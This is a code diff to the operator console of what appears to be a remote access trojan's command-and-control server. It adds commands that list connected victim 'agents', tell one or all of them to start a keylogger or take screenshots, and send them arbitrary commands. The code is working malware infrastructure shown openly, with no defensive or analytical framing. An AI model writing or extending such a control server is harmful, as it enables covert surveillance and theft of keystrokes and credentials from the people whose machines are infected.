@@ -55,6 +55,8 @@ def get_rsa_chiper(private_key_path: str = PRIVATE_KEY_NAME, key_dir: str = KEY_
 
 if TLS_ENABLED != "False":
     rsa_chipher = get_rsa_chiper()
+else:
+    rsa_chipher = None
 
 
 def out_new_line(addr: str,
@@ -90,7 +92,6 @@ def out_new_line(addr: str,
                       )
 
 # initialize server
-
 
 def start_server(lhost: str = LHOST, lport: int = LPORT):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -129,18 +130,90 @@ def start_server(lhost: str = LHOST, lport: int = LPORT):
 
 # terminal commands
 
-
 def terminal(args):
     def help_command():
         logger.info(f"Available commands: {', '.join(commands.keys())}")
 
+    def list_agents_command():
+        logger.info("Connected agents:")
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+        else:
+            for addr in agents.keys():
+                logger.info(f"- {addr}")
+
     def keylogger_command():
-        logger.info("keylogger started")
-        # will send command to the client side to start the keylogger module
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+            return
+        
+        # Show available agents
+        logger.info("Available agents:")
+        for i, addr in enumerate(agents.keys(), 1):
+            logger.info(f"{i}. {addr}")
+        
+        try:
+            choice = input("Select agent number (or 'all' for all agents): ").strip()
+            if choice.lower() == 'all':
+                for addr in agents.keys():
+                    agent_tool.send_msg_by_rhost(addr, "START_KEYLOGGER")
+                    logger.info(f"Keylogger command sent to {addr}")
+            else:
+                agent_list = list(agents.keys())
+                selected_addr = agent_list[int(choice) - 1]
+                agent_tool.send_msg_by_rhost(selected_addr, "START_KEYLOGGER")
+                logger.info(f"Keylogger command sent to {selected_addr}")
+        except (ValueError, IndexError):
+            logger.error("Invalid selection.")
 
     def screenshot_command():
-        logger.info("screenshot started")
-        # will send command to the client side to start the screenshot module
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+            return
+        
+        # Show available agents
+        logger.info("Available agents:")
+        for i, addr in enumerate(agents.keys(), 1):
+            logger.info(f"{i}. {addr}")
+        
+        try:
+            choice = input("Select agent number (or 'all' for all agents): ").strip()
+            if choice.lower() == 'all':
+                for addr in agents.keys():
+                    agent_tool.send_msg_by_rhost(addr, "TAKE_SCREENSHOT")
+                    logger.info(f"Screenshot command sent to {addr}")
+            else:
+                agent_list = list(agents.keys())
+                selected_addr = agent_list[int(choice) - 1]
+                agent_tool.send_msg_by_rhost(selected_addr, "TAKE_SCREENSHOT")
+                logger.info(f"Screenshot command sent to {selected_addr}")
+        except (ValueError, IndexError):
+            logger.error("Invalid selection.")
+
+    def send_custom_command():
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+            return
+        
+        # Show available agents
+        logger.info("Available agents:")
+        for i, addr in enumerate(agents.keys(), 1):
+            logger.info(f"{i}. {addr}")
+        
+        try:
+            choice = input("Select agent number: ").strip()
+            agent_list = list(agents.keys())
+            selected_addr = agent_list[int(choice) - 1]
+            
+            custom_msg = input("Enter message to send: ").strip()
+            agent_tool.send_msg_by_rhost(selected_addr, custom_msg)
+            logger.info(f"Message '{custom_msg}' sent to {selected_addr}")
+        except (ValueError, IndexError):
+            logger.error("Invalid selection.")
 
     def exit_command():
         logger.info("Goodbye.")
@@ -148,8 +221,10 @@ def terminal(args):
 
     commands = {
         "help": help_command,
+        "agents": list_agents_command,
         "keylogger": keylogger_command,
         "screenshot": screenshot_command,
+        "send": send_custom_command,
         "exit": exit_command,
         "back": lambda: logger.info("Returning to main menu..."),
     }
